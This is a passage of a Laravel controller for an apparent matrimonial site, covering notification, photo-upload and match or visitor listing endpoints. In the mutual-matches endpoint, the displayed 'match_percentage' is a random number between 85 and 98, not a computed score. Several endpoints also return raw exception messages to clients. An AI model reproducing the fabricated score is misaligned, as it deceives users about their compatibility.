        } catch (\Exception $e) {
            report($e);
            return response()->json([
                'success' => false
            ], 500);
        }
    }

    public static function sendFirebaseNotification($notify_user, $notify_type, $message, $notify_by = null, $fcmTokens = null)
    {
        // send firebase notification for mobile app
        if ($notify_user->fcm_token != null) {
            $data = (object) [];
            $data->fcm_token = $notify_user->fcm_token;
            $data->title = $notify_type;
            $data->text = $message;
            $data->notify_by = $notify_by;
            FirbaseNotification::send($data);
        }
        // end of  firebase notification

        Larafirebase::withTitle(str_replace("_", " ", $notify_type))
            ->withBody($message)
            ->sendMessage($fcmTokens);
    }

    /**
     * Upload profile picture
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function upload_profile_picture(Request $request)
    {
        try {
            $request->validate([
                'photo' => 'required|image|mimes:jpeg,png,jpg,gif|max:5120', // 5MB max
            ]);

            $user = Auth::user();

            if (!$user) {
                return response()->json([
                    'success' => false,
                    'message' => translate('User not authenticated')
                ], 401);
            }

            // Upload the image
            $photo = null;
            if ($request->hasFile('photo')) {
                $photo = upload_api_file($request->file('photo'));

                // Update user photo
                $user->photo = $photo;

                // Check if admin approval is required
                if (get_setting('profile_picture_approval_by_admin') && auth()->user()->user_type == 'member') {
                    $user->photo_approved = 0;
                } else {
                    $user->photo_approved = 1;
                }

                $user->save();

                return response()->json([
                    'success' => true,
                    'message' => translate('Profile picture uploaded successfully!'),
                    'photo_url' => uploaded_asset($photo),
                    'photo_id' => $photo,
                    'requires_approval' => get_setting('profile_picture_approval_by_admin') && auth()->user()->user_type == 'member'
                ]);
            }

            return response()->json([
                'success' => false,
                'message' => translate('No file uploaded')
            ], 400);

        } catch (\Exception $e) {
            \Log::error('Profile picture upload error: ' . $e->getMessage());
            return response()->json([
                'success' => false,
                'message' => translate('Failed to upload profile picture. Please try again.')
            ], 500);
        }
    }

    /**
     * Get incoming interests for AJAX
     */
    public function getIncomingInterests()
    {
        try {
            $user = auth()->user();
            if (!$user || $user->user_type != 'member') {
                return response()->json(['success' => false, 'message' => 'Unauthorized'], 401);
            }

            $incoming_interests = \App\Models\ExpressInterest::where('user_id', $user->id)
                ->where('status', 0)
                ->with([
                    'interestedby' => function ($query) {
                        $query->select('id', 'first_name', 'last_name', 'photo');
                    }
                ])
                ->with([
                    'interestedby.member' => function ($query) {
                        $query->select('user_id', 'birthday');
                    }
                ])
                ->with([
                    'interestedby.addresses' => function ($query) {
                        $query->select('user_id', 'city_id')->where('type', 'present');
                    }
                ])
                ->with([
                    'interestedby.addresses.city' => function ($query) {
                        $query->select('id', 'name');
                    }
                ])
                ->latest()
                ->limit(5)
                ->get()
                ->map(function ($interest) {
                    try {
                        $interestedUser = $interest->interestedby ?? null;
                        if (!$interestedUser)
                            return null;

                        $age = '';
                        if ($interestedUser->member && $interestedUser->member->birthday) {
                            $age = \Carbon\Carbon::parse($interestedUser->member->birthday)->age;
                        }

                        $location = 'N/A';
                        $address = $interestedUser->addresses->first();
                        if ($address && $address->city) {
                            $location = $address->city->name ?? 'N/A';
                        }

                        $isOnline = Cache::has('user-is-online-' . $interestedUser->id);

                        return [
                            'id' => $interestedUser->id ?? 0,
                            'name' => ($interestedUser->first_name ?? '') . ' ' . ($interestedUser->last_name ?? ''),
                            'age' => $age,
                            'location' => $location,
                            'photo' => $interestedUser->photo ? uploaded_asset($interestedUser->photo) : null,
                            'interest_id' => $interest->id ?? 0,
                            'is_online' => $isOnline
                        ];
                    } catch (\Exception $e) {
                        return null;
                    }
                })->filter()->values();

            return response()->json([
                'success' => true,
                'data' => $incoming_interests,
                'count' => $incoming_interests->count()
            ]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    /**
     * Get mutual matches for AJAX
     */
    public function getMutualMatches()
    {
        try {
            $user = auth()->user();
            if (!$user || $user->user_type != 'member') {
                return response()->json(['success' => false, 'message' => 'Unauthorized'], 401);
            }

            $mutual_matches = \App\Models\ExpressInterest::where('user_id', $user->id)
                ->where('status', 1)
                ->with([
                    'interestedby' => function ($query) {
                        $query->select('id', 'first_name', 'last_name', 'photo');
                    }
                ])
                ->with([
                    'interestedby.member' => function ($query) {
                        $query->select('user_id', 'birthday');
                    }
                ])
                ->with([
                    'interestedby.addresses' => function ($query) {
                        $query->select('user_id', 'city_id')->where('type', 'present');
                    }
                ])
                ->with([
                    'interestedby.addresses.city' => function ($query) {
                        $query->select('id', 'name');
                    }
                ])
                ->latest()
                ->limit(3)
                ->get()
                ->map(function ($match) {
                    try {
                        $matchUser = $match->interestedby ?? null;
                        if (!$matchUser)
                            return null;

                        $age = null;
                        if ($matchUser->member && $matchUser->member->birthday) {
                            $age = \Carbon\Carbon::parse($matchUser->member->birthday)->age;
                        }

                        $location = 'N/A';
                        $address = $matchUser->addresses->first();
                        if ($address && $address->city) {
                            $location = $address->city->name ?? 'N/A';
                        }

                        $isOnline = Cache::has('user-is-online-' . $matchUser->id);

                        return [
                            'id' => $matchUser->id ?? 0,
                            'name' => ($matchUser->first_name ?? '') . ' ' . ($matchUser->last_name ?? ''),
                            'age' => $age,
                            'location' => $location,
                            'photo' => $matchUser->photo ? uploaded_asset($matchUser->photo) : null,
                            'match_percentage' => rand(85, 98),
                            'is_online' => $isOnline
                        ];
                    } catch (\Exception $e) {
                        return null;
                    }
                })->filter()->values();

            return response()->json([
                'success' => true,
                'data' => $mutual_matches
            ]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    /**
     * Get recent visitors for AJAX
     */
    public function getRecentVisitors()
    {
        try {
            $user = auth()->user();
            if (!$user || $user->user_type != 'member') {
                return response()->json(['success' => false, 'message' => 'Unauthorized'], 401);
            }

            $recent_visitors = \App\Models\ProfileViewer::where('user_id', $user->id)
                ->with([
                    'profileViewer' => function ($query) {
                        $query->select('id', 'first_name', 'last_name', 'photo');
                    }
                ])
                ->with([
                    'profileViewer.member' => function ($query) {
                        $query->select('user_id', 'birthday');
                    }
                ])
                ->with([
                    'profileViewer.addresses' => function ($query) {
                        $query->select('user_id', 'city_id')->where('type', 'present');
                    }
                ])
                ->with([
                    'profileViewer.addresses.city' => function ($query) {
                        $query->select('id', 'name');
                    }
                ])
                ->latest()
                ->limit(3)
                ->get()
                ->map(function ($visitor) {
                    try {
                        if (!$visitor->profileViewer)
                            return null;

                        $age = null;
                        if ($visitor->profileViewer->member && $visitor->profileViewer->member->birthday) {
                            $age = \Carbon\Carbon::parse($visitor->profileViewer->member->birthday)->age;
                        }

                        $location = 'N/A';
                        $address = $visitor->profileViewer->addresses->first();
                        if ($address && $address->city) {
                            $location = $address->city->name ?? 'N/A';
                        }

                        $visitedTime = $visitor->created_at->diffForHumans();
                        $isOnline = Cache::has('user-is-online-' . $visitor->profileViewer->id);

                        return [
                            'id' => $visitor->profileViewer->id ?? 0,
                            'name' => ($visitor->profileViewer->first_name ?? '') . ' ' . ($visitor->profileViewer->last_name ?? ''),
                            'age' => $age,
                            'location' => $location,
                            'photo' => $visitor->profileViewer->photo ? uploaded_asset($visitor->profileViewer->photo) : null,
                            'visited_time' => $visitedTime,
                            'is_online' => $isOnline
                        ];
                    } catch (\Exception $e) {
                        return null;
                    }
                })->filter()->values();

            return response()->json([
                'success' => true,
                'data' => $recent_visitors
            ]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    /**
     * Get today matches for AJAX
     */
    public function getTodayMatches()
    {
        try {
            $user = auth()->user();
            if (!$user || $user->user_type != 'member') {
                return response()->json(['success' => false, 'message' => 'Unauthorized'], 401);
            }

            $today_matches = \App\Models\User::where('user_type', 'member')
                ->where('approved', 1)
                ->where('id', '!=', $user->id)
                ->where('created_at', '>=', now()->subMonth())
                ->with([
                    'member' => function ($query) {
                        $query->select('user_id', 'birthday');
                    }
                ])
                ->with([
                    'addresses' => function ($query) {
                        $query->select('user_id', 'city_id')->where('type', 'present');
                    }
                ])
                ->with([
                    'addresses.city' => function ($query) {
                        $query->select('id', 'name');
                    }
                ])
                ->latest()
                ->limit(10)
                ->get()
                ->map(function ($newUser) {
                    try {
                        $age = null;
                        if ($newUser->member && $newUser->member->birthday) {
                            $age = \Carbon\Carbon::parse($newUser->member->birthday)->age;
                        }

                        $location = 'N/A';
                        $address = $newUser->addresses->first();
                        if ($address && $address->city) {
                            $location = $address->city->name ?? 'N/A';
                        }

                        $joinedTime = $newUser->created_at->diffForHumans();
                        $isOnline = Cache::has('user-is-online-' . $newUser->id);

                        return [
                            'id' => $newUser->id ?? 0,
                            'name' => ($newUser->first_name ?? '') . ' ' . ($newUser->last_name ?? ''),
                            'age' => $age,
                            'location' => $location,
                            'photo' => $newUser->photo ? uploaded_asset($newUser->photo) : null,
                            'joined_time' => $joinedTime,
                            'is_online' => $isOnline
                        ];
                    } catch (\Exception $e) {
                        return null;
                    }
                })->filter()->values();

            return response()->json([
                'success' => true,
                'data' => $today_matches
            ]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    /**
     * Get success stories for AJAX
     */
    public function getSuccessStories()
    {
        try {
            $user = auth()->user();
            if (!$user || $user->user_type != 'member') {
                return response()->json(['success' => false, 'message' => 'Unauthorized'], 401);
            }

            $success_stories = \App\Models\HappyStory::where('approved', 1)
                ->where('user_id', '!=', $user->id)
                ->with([
                    'user' => function ($query) {
                        $query->select('id', 'first_name', 'last_name');
                    }
                ])
                ->latest()
                ->limit(5)
                ->get()
                ->map(function ($story) {
                    try {
                        $coupleNames = 'Unknown Couple';
                        if ($story->user && $story->partner_name) {
                            $coupleNames = ($story->user->first_name ?? 'Unknown') . ' & ' . ($story->partner_name ?? 'Partner');
                        }

                        $storyTitle = $story->title ?? 'Success Story';

                        $storyPreview = 'No story available';
                        if ($story->details) {
                            $details = strip_tags($story->details);
                            $storyPreview = strlen($details) > 150 ? substr($details, 0, 150) . '...' : $details;
                        }

                        $storyImage = null;
                        if ($story->photos) {
                            $photos = explode(',', $story->photos);
                            if (!empty($photos[0])) {
                                $storyImage = uploaded_asset($photos[0]);
                            }
                        }

                        $marriageDate = 'N/A';
                        if ($story->marriage_date) {
                            $marriageDate = \Carbon\Carbon::parse($story->marriage_date)->format('M d, Y');
                        } else {
                            $marriageDate = $story->created_at->format('M d, Y');
                        }

                        return [
                            'id' => $story->id ?? 0,
                            'title' => $storyTitle,
                            'couple_names' => $coupleNames,
                            'story_preview' => $storyPreview,
                            'story_full' => $story->details ?? '',
                            'marriage_date' => $marriageDate,
                            'image' => $storyImage,
                            'user_id' => $story->user_id ?? 0,
                            'user_name' => ($story->user->first_name ?? '') . ' ' . ($story->user->last_name ?? '')
                        ];
                    } catch (\Exception $e) {
                        \Log::error('Error processing success story: ' . $e->getMessage());
                        return null;
                    }
                })->filter()->values();

            return response()->json([
                'success' => true,
                'data' => $success_stories // Return all stories for slider
            ]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }
}
